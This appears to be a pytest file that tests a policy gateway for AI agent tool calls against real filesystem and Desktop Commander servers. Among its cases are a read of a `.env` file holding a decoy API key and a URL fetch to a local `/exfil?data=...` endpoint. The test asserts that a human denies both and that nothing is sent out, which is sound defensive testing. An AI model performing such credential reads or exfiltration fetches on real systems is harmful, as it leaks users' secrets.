"""The built-in starter policy (SENTINEL_POLICY=builtin:starter; workflow A2) in front of REAL servers: the reference filesystem server and the
third-party Desktop Commander. Asserted: a plain read is allowed by policy with no human card, a credential-like path (`.env`) and a URL fetch
(`isUrl: true`) reach a human, and what the human denies never happens (the secret is not returned, the local HTTP target gets 0 requests).
Then `eventlog_cli replay` re-runs the logged session. Exact rule ids are not asserted: the starter rules evolve."""
import pytest

from tests.harness import Agent, Backend, Operator
from tests.live import livelib
from tests.reality_fixtures import realdeps  # noqa: F401  (fixture)

pytestmark = pytest.mark.reality

SECRET = "sk-live-test-DECOY-7f3a9c"


@pytest.fixture(scope="module")
def hub(tmp_path_factory):
    tmp = tmp_path_factory.mktemp("starter")
    b = Backend(tmp / "backend.log", {"SENTINEL_POLICY": "builtin:starter", "SENTINEL_EVENT_LOG": str(tmp / "events.db"), "SENTINEL_LOG_KEY": livelib.LOG_KEY})
    b.db = tmp / "events.db"
    yield b
    b.stop()


def _project(tmp_path):
    proj = tmp_path / "proj"
    proj.mkdir()
    (proj / "notes.txt").write_text("plain project notes\n")
    (proj / ".env").write_text(f"API_KEY={SECRET}\n")
    return proj


class Human:
    """Denies everything it is shown (so whatever reaches a human here must NOT happen) and records the cards."""

    def __init__(self):
        self.cards = []

    def __call__(self, p):
        self.cards.append(p)
        return "deny"

    def tools(self, sid):
        return [(c["tool"], c["args"]) for c in self.cards if c["session_id"] == sid]


async def _run(hub, server, sid, tmp_path, cases):
    human = Human()
    op = await Operator.connect(hub, human)
    agent = await Agent.start(hub, sid, {"srv": server}, tmp_path)
    out = []
    try:
        for tool, args in cases:
            n = len(human.tools(sid))
            r = await agent.call(tool, args, timeout=120)
            out.append((r, len(human.tools(sid)) > n))
    finally:
        await agent.stop()
        await op.close()
    return out, human


def _policy_allowed(hub, sid, tool, path):
    evs = livelib.events(hub.db, sid)
    props, decs = livelib.proposals(evs), livelib.decisions(evs)
    return [decs[c] for c, p in props.items() if p["tool"] == tool and p["args"].get("path") == path]


async def test_starter_on_the_real_filesystem_server(realdeps, hub, tmp_path):
    proj = _project(tmp_path)
    sid = "starter-fs"
    (read, read_card), (env, env_card), (write, write_card) = (await _run(hub, {"command": realdeps["filesystem"], "args": [str(proj)]}, sid, tmp_path, [
        ("read_file", {"path": str(proj / "notes.txt")}),
        ("read_file", {"path": str(proj / ".env")}),
        ("write_file", {"path": str(proj / "new.txt"), "content": "x"}),
    ]))[0]
    assert not read["is_error"] and "plain project notes" in read["text"] and not read_card          # allowed by policy, no human needed
    assert [d["actor"] for d in _policy_allowed(hub, sid, "read_file", str(proj / "notes.txt"))] == ["policy"]
    assert env_card and env["is_error"] and SECRET not in env["text"]                                   # .env reached a human; denied, not read
    assert write_card and write["is_error"] and not (proj / "new.txt").exists()                          # a write is a human decision; denied, not written


async def test_starter_on_desktop_commander_a_url_fetch_reaches_a_human_and_a_denied_one_never_leaves(realdeps, hub, tmp_path):
    proj = _project(tmp_path)
    target = livelib.HitCounter()
    sid = "starter-dc"
    try:
        results, human = await _run(hub, livelib.dc_server(realdeps["desktop_commander"], tmp_path / "home"), sid, tmp_path, [
            ("read_file", {"path": str(proj / "notes.txt")}),
            ("list_directory", {"path": str(proj)}),
            ("read_file", {"path": str(proj / ".env")}),
            ("read_file", {"path": target.url("/exfil?data=secret-from-the-host"), "isUrl": True}),
        ])
    finally:
        target.close()
    (read, read_card), (ls, ls_card), (env, env_card), (url, url_card) = results
    assert not read["is_error"] and not read_card and not ls["is_error"] and not ls_card and ".env" in ls["text"]   # plain reads: no card
    assert [d["actor"] for d in _policy_allowed(hub, sid, "read_file", str(proj / "notes.txt"))] == ["policy"]
    assert env_card and env["is_error"] and SECRET not in env["text"]
    assert url_card and url["is_error"] and url["text"].startswith("Denied by SENTINEL")
    assert target.hits == []                                                    # the denied fetch never left: 0 requests reached the target
    assert {t for t, _ in human.tools(sid)} == {"read_file"} and all(a.get("isUrl") or ".env" in a["path"] for _, a in human.tools(sid))

    rep = livelib.cli_json("replay", str(hub.db), "--session", sid)
    assert rep["summary"]["proposals"] == 4
    assert [c["decision"] for c in rep["calls"]] == ["approve", "approve", "deny", "deny"]
    assert [c["actor"] for c in rep["calls"]] == ["policy", "policy", "human", "human"]
